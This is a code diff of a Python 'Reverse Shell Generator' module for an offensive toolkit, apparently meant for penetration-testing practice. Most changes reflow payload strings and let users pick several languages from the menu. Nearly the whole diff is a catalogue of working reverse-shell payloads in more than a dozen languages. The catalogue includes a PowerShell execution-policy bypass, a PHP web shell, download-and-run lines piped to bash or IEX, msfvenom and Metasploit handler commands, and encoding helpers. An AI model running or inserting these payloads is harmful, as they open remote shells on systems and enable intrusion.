@@ -1,6 +1,8 @@
 """
-Reverse Shell Generator module for Leegion Framework
-Comprehensive reverse shell payloads in multiple languages and formats
+Reverse Shell Generator Module for Leegion Framework
+
+This module provides reverse shell payload generation for various
+platforms and programming languages.
 
 Author: Leegion
 Project: Leegion Framework v2.0
@@ -10,7 +12,7 @@ Copyright (c) 2025 Leegion. All rights reserved.
 import json
 import os
 import base64
-from typing import Dict, List, Any, Optional, Tuple, Set
+from typing import Dict, List, Any, Set, Tuple
 from datetime import datetime
 from core.base_module import BaseModule
 from core.banner import print_module_header
@@ -33,79 +35,278 @@ class ReverseShellGenerator(BaseModule):
                 "basic": "bash -i >& /dev/tcp/{ip}/{port} 0>&1",
                 "with_nc": "nc -e /bin/bash {ip} {port}",
                 "with_nc_alt": "nc {ip} {port} -e /bin/bash",
-                "with_socat": "socat tcp-connect:{ip}:{port} exec:bash,pty,stderr,setsid,sigint,sane",
-                "with_python": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
+                "with_socat": (
+                    "socat tcp-connect:{ip}:{port} "
+                    "exec:bash,pty,stderr,setsid,sigint,sane"
+                ),
+                "with_python": (
+                    "python3 -c \"import socket,subprocess,os;"
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                    "s.connect(('{ip}',{port}));"
+                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                    "os.dup2(s.fileno(),2);"
+                    "subprocess.call(['/bin/bash','-i']);\""
+                ),
                 "encoded": "echo {b64_payload} | base64 -d | bash",
                 "one_liner": 'bash -c "bash -i >& /dev/tcp/{ip}/{port} 0>&1"',
             },
             "python": {
-                "basic": "python3 -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
-                "python2": "python -c \"import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(['/bin/bash','-i']);\"",
-                "with_pty": "python3 -c \"import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(('{ip}',{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn('/bin/bash');\"",
-                "encoded": "python3 -c \"import base64;exec(base64.b64decode('{b64_payload}'))\"",
-                "oneliner": "python3 -c \"import socket,subprocess,os;s=socket.socket();s.connect(('{ip}',{port}));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];subprocess.call(['/bin/bash']);\"",
+                "basic": (
+                    "python3 -c \"import socket,subprocess,os;"
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                    "s.connect(('{ip}',{port}));"
+                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                    "os.dup2(s.fileno(),2);"
+                    "subprocess.call(['/bin/bash','-i']);\""
+                ),
+                "python2": (
+                    "python -c \"import socket,subprocess,os;"
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                    "s.connect(('{ip}',{port}));"
+                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                    "os.dup2(s.fileno(),2);"
+                    "subprocess.call(['/bin/bash','-i']);\""
+                ),
+                "with_pty": (
+                    "python3 -c \"import socket,subprocess,os,pty;"
+                    "s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);"
+                    "s.connect(('{ip}',{port}));"
+                    "os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);"
+                    "os.dup2(s.fileno(),2);pty.spawn('/bin/bash');\""
+                ),
+                "encoded": (
+                    "python3 -c \"import base64;"
+                    "exec(base64.b64decode('{b64_payload}'))\""
+                ),
+                "oneliner": (
+                    "python3 -c \"import socket,subprocess,os;"
+                    "s=socket.socket();s.connect(('{ip}',{port}));"
+                    "[os.dup2(s.fileno(),fd) for fd in (0,1,2)];"
+                    "subprocess.call(['/bin/bash']);\""
+                ),
             },
             "powershell": {
-                "basic": "powershell -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
+                "basic": (
+                    "powershell -c \"$client = New-Object "
+                    "System.Net.Sockets.TCPClient('{ip}',{port});"
+                    "$stream = $client.GetStream();"
+                    "[byte[]]$bytes = 0..65535|%{{0}};"
+                    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
+                    "$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
+                    ".GetString($bytes,0, $i);"
+                    "$sendback = (iex $data 2>&1 | Out-String );"
+                    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+                    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+                    "$stream.Write($sendbyte,0,$sendbyte.Length);"
+                    "$stream.Flush()}};$client.Close()\""
+                ),
                 "encoded": "powershell -enc {b64_payload}",
-                "bypass": "powershell -ExecutionPolicy Bypass -c \"$client = New-Object System.Net.Sockets.TCPClient('{ip}',{port});$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{{0}};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()\"",
-                "nishang": "powershell -c \"IEX (New-Object Net.WebClient).DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1');Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}\"",
+                "bypass": (
+                    "powershell -ExecutionPolicy Bypass -c \"$client = New-Object "
+                    "System.Net.Sockets.TCPClient('{ip}',{port});"
+                    "$stream = $client.GetStream();"
+                    "[byte[]]$bytes = 0..65535|%{{0}};"
+                    "while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){{;"
+                    "$data = (New-Object -TypeName System.Text.ASCIIEncoding)"
+                    ".GetString($bytes,0, $i);"
+                    "$sendback = (iex $data 2>&1 | Out-String );"
+                    "$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';"
+                    "$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);"
+                    "$stream.Write($sendbyte,0,$sendbyte.Length);"
+                    "$stream.Flush()}};$client.Close()\""
+                ),
+                "nishang": (
+                    "powershell -c \"IEX (New-Object Net.WebClient)"
+                    ".DownloadString('http://{ip}/Invoke-PowerShellTcp.ps1');"
+                    "Invoke-PowerShellTcp -Reverse -IPAddress {ip} -Port {port}\""
+                ),
             },
             "php": {
-                "basic": 'php -r \'$sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");\'',
-                "with_shell": 'php -r \'$sock=fsockopen("{ip}",{port});shell_exec("/bin/bash -i <&3 >&3 2>&3");\'',
-                "system": 'php -r \'$sock=fsockopen("{ip}",{port});system("/bin/bash -i <&3 >&3 2>&3");\'',
-                "passthru": 'php -r \'$sock=fsockopen("{ip}",{port});passthru("/bin/bash -i <&3 >&3 2>&3");\'',
-                "web_shell": '<?php $sock=fsockopen("{ip}",{port});exec("/bin/bash -i <&3 >&3 2>&3");?>',
+                "basic": (
+                    'php -r \'$sock=fsockopen("{ip}",{port});'
+                    'exec("/bin/bash -i <&3 >&3 2>&3");\''
+                ),
+                "with_shell": (
+                    'php -r \'$sock=fsockopen("{ip}",{port});'
+                    'shell_exec("/bin/bash -i <&3 >&3 2>&3");\''
+                ),
+                "system": (
+                    'php -r \'$sock=fsockopen("{ip}",{port});'
+                    'system("/bin/bash -i <&3 >&3 2>&3");\''
+                ),
+                "passthru": (
+                    'php -r \'$sock=fsockopen("{ip}",{port});'
+                    'passthru("/bin/bash -i <&3 >&3 2>&3");\''
+                ),
+                "web_shell": (
+                    '<?php $sock=fsockopen("{ip}",{port});'
+                    'exec("/bin/bash -i <&3 >&3 2>&3");?>'
+                ),
             },
             "perl": {
-                "basic": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");}};\'',
-                "with_sh": 'perl -e \'use Socket;$i="{ip}";$p={port};socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){{open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");}};\'',
-                "oneliner": "perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'",
+                "basic": (
+                    'perl -e \'use Socket;$i="{ip}";$p={port};'
+                    'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
+                    'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
+                    'exec("/bin/bash -i");}};\''
+                ),
+                "with_sh": (
+                    'perl -e \'use Socket;$i="{ip}";$p={port};'
+                    'socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));'
+                    'if(connect(S,sockaddr_in($p,inet_aton($i)))){{'
+                    'open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");'
+                    'exec("/bin/sh -i");}};\''
+                ),
+                "oneliner": (
+                    "perl -MIO -e '$p=fork;exit,if($p);"
+                    "$c=new IO::Socket::INET(PeerAddr,\"{ip}:{port}\");"
+                    "STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'"
+                ),
             },
             "ruby": {
-                "basic": 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
-                "with_bash": 'ruby -rsocket -e\'exit if fork;c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
-                "oneliner": 'ruby -rsocket -e\'c=TCPSocket.new("{ip}","{port}");while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\'',
+                "basic": (
+                    'ruby -rsocket -e\'exit if fork;'
+                    'c=TCPSocket.new("{ip}","{port}");'
+                    'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
+                ),
+                "with_bash": (
+                    'ruby -rsocket -e\'exit if fork;'
+                    'c=TCPSocket.new("{ip}","{port}");'
+                    'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
+                ),
+                "oneliner": (
+                    'ruby -rsocket -e\'c=TCPSocket.new("{ip}","{port}");'
+                    'while(cmd=c.gets);IO.popen(cmd,"r"){{|io|c.print io.read}}end\''
+                ),
             },
             "java": {
-                "basic": 'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c","exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; do $line 2>&5 >&5; done"] as String[]); p.waitFor();',
-                "with_socket": 'String host="{ip}"; int port={port}; String cmd="/bin/bash"; Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();Socket s=new Socket(host,port);InputStream pi=p.getInputStream(),pe=p.getErrorStream(),si=s.getInputStream();OutputStream po=p.getOutputStream(),so=s.getOutputStream();while(!s.isClosed()){{while(pi.available()>0)so.write(pi.read());while(si.available()>0)po.write(si.read());while(pe.available()>0)so.write(pe.read());so.flush();po.flush();Thread.sleep(50);try {{p.exitValue();break;}}catch (Exception e){{}};}};p.destroy();s.close();',
+                "basic": (
+                    'r = Runtime.getRuntime(); p = r.exec(["/bin/bash","-c",'
+                    '"exec 5<>/dev/tcp/{ip}/{port};cat <&5 | while read line; '
+                    'do $line 2>&5 >&5; done"] as String[]); p.waitFor();'
+                ),
+                "with_socket": (
+                    'String host="{ip}"; int port={port}; String cmd="/bin/bash"; '
+                    'Process p=new ProcessBuilder(cmd).redirectErrorStream(true).start();'
+                    'Socket s=new Socket(host,port);'
+                    'InputStream pi=p.getInputStream(),pe=p.getErrorStream(),'
+                    'si=s.getInputStream();'
+                    'OutputStream po=p.getOutputStream(),so=s.getOutputStream();'
+                    'while(!s.isClosed()){{'
+                    'while(pi.available()>0)so.write(pi.read());'
+                    'while(si.available()>0)po.write(si.read());'
+                    'while(pe.available()>0)so.write(pe.read());'
+                    'so.flush();po.flush();Thread.sleep(50);'
+                    'try {{p.exitValue();break;}}catch (Exception e){{}};}};'
+                    'p.destroy();s.close();'
+                ),
             },
             "golang": {
-                "basic": 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/bash");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
-                "with_sh": 'package main;import"os/exec";import"net";func main(){{c,_:=net.Dial("tcp","{ip}:{port}");cmd:=exec.Command("/bin/sh");cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}',
+                "basic": (
+                    'package main;import"os/exec";import"net";func main(){{'
+                    'c,_:=net.Dial("tcp","{ip}:{port}");'
+                    'cmd:=exec.Command("/bin/bash");'
+                    'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
+                ),
+                "with_sh": (
+                    'package main;import"os/exec";import"net";func main(){{'
+                    'c,_:=net.Dial("tcp","{ip}:{port}");'
+                    'cmd:=exec.Command("/bin/sh");'
+                    'cmd.Stdin=c;cmd.Stdout=c;cmd.Stderr=c;cmd.Run()}}'
+                ),
             },
             "lua": {
-                "basic": "lua -e \"require('socket');require('os');t=socket.tcp();t:connect('{ip}','{port}');os.execute('/bin/bash -i <&3 >&3 2>&3');\""
+                "basic": (
+                    "lua -e \"require('socket');require('os');"
+                    "t=socket.tcp();t:connect('{ip}','{port}');"
+                    "os.execute('/bin/bash -i <&3 >&3 2>&3');\""
+                )
             },
             "nodejs": {
-                "basic": "node -e \"require('child_process').exec('bash -i >& /dev/tcp/{ip}/{port} 0>&1')\"",
-                "with_socket": "node -e \"var net = require('net');var spawn = require('child_process').spawn;HOST='{ip}';PORT='{port}';TIMEOUT='5000';if (typeof String.prototype.contains === 'undefined') {{ String.prototype.contains = function(it) {{ return this.indexOf(it) != -1; }}; }}function c(HOST,PORT) {{ var client = new net.Socket(); client.connect(PORT, HOST, function() {{ var sh = spawn('/bin/bash',[]); client.write('Connected\\n'); client.pipe(sh.stdin);sh.stdout.pipe(client);sh.stderr.pipe(client);sh.on('exit',function(code,signal){{ client.end('Disconnected\\n'); }}); }}); client.on('error', function(e) {{ setTimeout(function() {{c(HOST,PORT);}}, TIMEOUT); }}); }} c(HOST,PORT);\"",
+                "basic": (
+                    "node -e \"require('child_process').exec("
+                    "'bash -i >& /dev/tcp/{ip}/{port} 0>&1')\""
+                ),
+                "with_socket": (
+                    "node -e \"var net = require('net');"
+                    "var spawn = require('child_process').spawn;"
+                    "HOST='{ip}';PORT='{port}';TIMEOUT='5000';"
+                    "if (typeof String.prototype.contains === 'undefined') {{ "
+                    "String.prototype.contains = function(it) {{ "
+                    "return this.indexOf(it) != -1; }}; }}"
+                    "function c(HOST,PORT) {{ "
+                    "var client = new net.Socket(); "
+                    "client.connect(PORT, HOST, function() {{ "
+                    "var sh = spawn('/bin/bash',[]); "
+                    "client.write('Connected\\n'); "
+                    "client.pipe(sh.stdin);sh.stdout.pipe(client);"
+                    "sh.stderr.pipe(client);"
+                    "sh.on('exit',function(code,signal){{ "
+                    "client.end('Disconnected\\n'); }}); }}); "
+                    "client.on('error', function(e) {{ "
+                    "setTimeout(function() {{c(HOST,PORT);}}, TIMEOUT); }}); }} "
+                    "c(HOST,PORT);\""
+                ),
             },
             "telnet": {
                 "basic": "telnet {ip} {port} | /bin/bash | telnet {ip} {port}",
                 "with_nc": "nc {ip} {port} | /bin/bash | nc {ip} {port}",
             },
             "awk": {
-                "basic": 'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; while(42) {{ do{{ printf "shell>" |& s; s |& getline c; if(c){{ while ((c |& getline) > 0) print $0 |& s; close(c); }} }} while(c != "exit") close(s); }}}\' /dev/null'
+                "basic": (
+                    'awk \'BEGIN {{s = "/inet/tcp/0/{ip}/{port}"; '
+                    'while(42) {{ do{{ printf "shell>" |& s; s |& getline c; '
+                    'if(c){{ while ((c |& getline) > 0) print $0 |& s; '
+                    'close(c); }} }} while(c != "exit") close(s); }}}\' /dev/null'
+                )
             },
             "curl": {
                 "basic": "curl -s http://{ip}:{port}/shell.sh | bash",
                 "with_wget": "wget -qO- http://{ip}:{port}/shell.sh | bash",
             },
             "msfvenom": {
-                "linux_x86": "msfvenom -p linux/x86/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
-                "linux_x64": "msfvenom -p linux/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f elf > shell.elf",
-                "windows_x86": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
-                "windows_x64": "msfvenom -p windows/x64/shell_reverse_tcp LHOST={ip} LPORT={port} -f exe > shell.exe",
-                "php": "msfvenom -p php/reverse_php LHOST={ip} LPORT={port} -f raw > shell.php",
-                "asp": "msfvenom -p windows/shell_reverse_tcp LHOST={ip} LPORT={port} -f asp > shell.asp",
-                "jsp": "msfvenom -p java/shell_reverse_tcp LHOST={ip} LPORT={port} -f war > shell.war",
+                "linux_x86": (
+                    "msfvenom -p linux/x86/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f elf > shell.elf"
+                ),
+                "linux_x64": (
+                    "msfvenom -p linux/x64/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f elf > shell.elf"
+                ),
+                "windows_x86": (
+                    "msfvenom -p windows/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f exe > shell.exe"
+                ),
+                "windows_x64": (
+                    "msfvenom -p windows/x64/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f exe > shell.exe"
+                ),
+                "php": (
+                    "msfvenom -p php/reverse_php "
+                    "LHOST={ip} LPORT={port} -f raw > shell.php"
+                ),
+                "asp": (
+                    "msfvenom -p windows/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f asp > shell.asp"
+                ),
+                "jsp": (
+                    "msfvenom -p java/shell_reverse_tcp "
+                    "LHOST={ip} LPORT={port} -f war > shell.war"
+                ),
             },
             "metasploit": {
-                "handler": "use exploit/multi/handler\nset PAYLOAD windows/shell_reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit",
-                "web_delivery": "use exploit/multi/script/web_delivery\nset TARGET 2\nset PAYLOAD python/meterpreter/reverse_tcp\nset LHOST {ip}\nset LPORT {port}\nexploit",
+                "handler": (
+                    "use exploit/multi/handler\n"
+                    "set PAYLOAD windows/shell_reverse_tcp\n"
+                    "set LHOST {ip}\nset LPORT {port}\nexploit"
+                ),
+                "web_delivery": (
+                    "use exploit/multi/script/web_delivery\n"
+                    "set TARGET 2\n"
+                    "set PAYLOAD python/meterpreter/reverse_tcp\n"
+                    "set LHOST {ip}\nset LPORT {port}\nexploit"
+                ),
             },
         }
 
@@ -160,7 +361,8 @@ class ReverseShellGenerator(BaseModule):
         print(f"\033[96mFavorite Payloads:\033[0m {favorites_count}")
         print(f"\033[96mHistory:\033[0m {history_count}")
         print(
-            f"\033[93m🎯 BEGINNER TIP:\033[0m Practice reverse shells on \033[92mtryhackme.com\033[0m"
+            "\033[93m🎯 BEGINNER TIP:\033[0m Practice reverse shells on "
+            "\033[92mtryhackme.com\033[0m"
         )
         print(f"\033[93m{'-'*65}\033[0m")
         print("\033[96m 1.\033[0m Generate Payloads")
@@ -175,7 +377,8 @@ class ReverseShellGenerator(BaseModule):
         print("\033[96m10.\033[0m Back to Main Menu")
         print(f"\033[93m{'='*65}\033[0m")
         print(
-            "\033[93m💡 TIP:\033[0m You can also enter a language name directly (e.g., 'php', 'python', 'bash')"
+            "\033[93m💡 TIP:\033[0m You can also enter a language name directly "
+            "(e.g., 'php', 'python', 'bash')"
         )
         print(f"\033[93m{'='*65}\033[0m")
 
@@ -198,31 +401,71 @@ class ReverseShellGenerator(BaseModule):
             port_int = int(port)
             if not (1 <= port_int <= 65535):
                 raise ValueError("Port out of range")
-            port = port_int
         except ValueError:
-            self.print_error("Invalid port number")
+            self.print_error("Invalid port number. Must be 1-65535")
             return
 
-        # Get payload type
-        print("\nAvailable payload types:")
+        # Show available languages
+        print("\n\033[93mAvailable Languages:\033[0m")
         languages = list(self.payloads.keys())
         for i, lang in enumerate(languages, 1):
-            print(f"\033[96m{i:2d}.\033[0m {lang.upper()}")
+            print(f"  {i:2d}. {lang.title()}")
 
-        choice = self.get_user_input(f"Select language (1-{len(languages)}): ")
+        # Get language selection
+        print("\n\033[96mSelect languages (comma-separated, 'all' for all):\033[0m")
+        selection_input = self.get_user_input("Selection: ")
+        if not selection_input:
+            self.print_info("No selection made. Returning to menu.")
+            return
+        selection = selection_input.strip().lower()
 
-        if not choice:
+        if not selection:
+            self.print_info("No selection made. Returning to menu.")
             return
 
-        try:
-            choice_idx = int(choice) - 1
-            if 0 <= choice_idx < len(languages):
-                selected_lang = languages[choice_idx]
-                self._display_language_payloads(selected_lang, ip, port)
-            else:
-                self.print_error("Invalid selection")
-        except ValueError:
-            self.print_error("Invalid input")
+        selected_languages = []
+        if selection == "all":
+            selected_languages = languages
+        else:
+            # Parse comma-separated selection
+            try:
+                indices = [int(x.strip()) - 1 for x in selection.split(",")]
+                for idx in indices:
+                    if 0 <= idx < len(languages):
+                        selected_languages.append(languages[idx])
+                    else:
+                        self.print_warning(f"Invalid index: {idx + 1}")
+            except ValueError:
+                # Try direct language names
+                for lang in selection.split(","):
+                    lang = lang.strip()
+                    if lang in languages:
+                        selected_languages.append(lang)
+                    else:
+                        self.print_warning(f"Unknown language: {lang}")
+
+        if not selected_languages:
+            self.print_error("No valid languages selected")
+            return
+
+        # Generate payloads for selected languages
+        print(f"\n\033[93mGenerating payloads for: {', '.join(selected_languages)}\033[0m")
+        print(f"\033[93mTarget: {ip}:{port}\033[0m")
+        print(f"\033[93m{'-'*60}\033[0m")
+
+        for language in selected_languages:
+            self._display_language_payloads(language, ip, port_int)
+
+        # Add to history
+        for language in selected_languages:
+            for payload_type in self.payloads[language]:
+                payload = self.payloads[language][payload_type].format(
+                    ip=ip, port=port_int
+                )
+                self._add_to_history(language, payload_type, payload, ip, port_int)
+
+        self.print_success(f"Generated {len(selected_languages)} language payloads")
+        input("\n\033[93mPress Enter to continue...\033[0m")
 
     def _display_language_payloads(self, language: str, ip: str, port: int):
         """Display all payloads for a specific language"""
@@ -342,10 +585,10 @@ class ReverseShellGenerator(BaseModule):
             print(f"\033[92m{command}\033[0m")
 
         print(
-            f"\n\033[93m🎯 TIP:\033[0m Use \033[92mnetcat\033[0m for basic reverse shells"
+            "\n\033[93m🎯 TIP:\033[0m Use \033[92mnetcat\033[0m for basic reverse shells"
         )
         print(
-            f"\033[93m🎯 TIP:\033[0m Use \033[92msocat\033[0m for more stable connections"
+            "\033[93m🎯 TIP:\033[0m Use \033[92msocat\033[0m for more stable connections"
         )
 
     def _payload_categories(self):
@@ -370,7 +613,7 @@ class ReverseShellGenerator(BaseModule):
                 print(f"    \033[96m•\033[0m {lang.upper()}")
 
         print(
-            f"\n\033[93mOr enter a specific language (e.g., 'php', 'python', 'bash')\033[0m"
+            "\n\033[93mOr enter a specific language (e.g., 'php', 'python', 'bash')\033[0m"
         )
         choice = self.get_user_input("\nSelect category or language: ")
 
@@ -544,7 +787,7 @@ class ReverseShellGenerator(BaseModule):
                 ).decode()
                 formatted_payload = formatted_payload.format(b64_payload=b64_payload)
 
-        print(f"\n\033[96mPayload:\033[0m")
+        print("\n\033[96mPayload:\033[0m")
         print(f"\033[92m{formatted_payload}\033[0m")
 
         # Add to history
@@ -710,8 +953,8 @@ class ReverseShellGenerator(BaseModule):
             print(f"   Target: {ip}:{port}")
             print(f"   Payload: \033[92m{payload}\033[0m")
 
-        print(f"\n\033[96m1.\033[0m Remove from favorites")
-        print(f"\033[96m2.\033[0m Clear all favorites")
+        print("\n\033[96m1.\033[0m Remove from favorites")
+        print("\033[96m2.\033[0m Clear all favorites")
 
         choice = self.get_user_input("Select option: ")
 
@@ -757,7 +1000,7 @@ class ReverseShellGenerator(BaseModule):
         # Base64 encoding
         try:
             b64_encoded = base64.b64encode(payload.encode()).decode()
-            print(f"\n\033[96mBase64:\033[0m")
+            print("\n\033[96mBase64:\033[0m")
             print(f"\033[92m{b64_encoded}\033[0m")
         except Exception as e:
             print(f"Base64 encoding failed: {e}")
@@ -767,7 +1010,7 @@ class ReverseShellGenerator(BaseModule):
             url_encoded = (
                 payload.replace(" ", "%20").replace("&", "%26").replace("|", "%7C")
             )
-            print(f"\n\033[96mURL Encoded:\033[0m")
+            print("\n\033[96mURL Encoded:\033[0m")
             print(f"\033[92m{url_encoded}\033[0m")
         except Exception as e:
             print(f"URL encoding failed: {e}")
@@ -775,7 +1018,7 @@ class ReverseShellGenerator(BaseModule):
         # Hex encoding
         try:
             hex_encoded = payload.encode().hex()
-            print(f"\n\033[96mHex:\033[0m")
+            print("\n\033[96mHex:\033[0m")
             print(f"\033[92m{hex_encoded}\033[0m")
         except Exception as e:
             print(f"Hex encoding failed: {e}")
@@ -951,7 +1194,7 @@ class ReverseShellGenerator(BaseModule):
 
     def _show_listener_command(self, port: int):
         """Show the appropriate listener command"""
-        print(f"\n\033[93m🎯 Listener Command:\033[0m")
+        print("\n\033[93m🎯 Listener Command:\033[0m")
         print(f"\033[92mnetcat -lvnp {port}\033[0m")
         print(
             f"\033[93mOr use:\033[0m \033[92msocat -d -d TCP-LISTEN:{port},reuseaddr,fork STDOUT\033[0m"
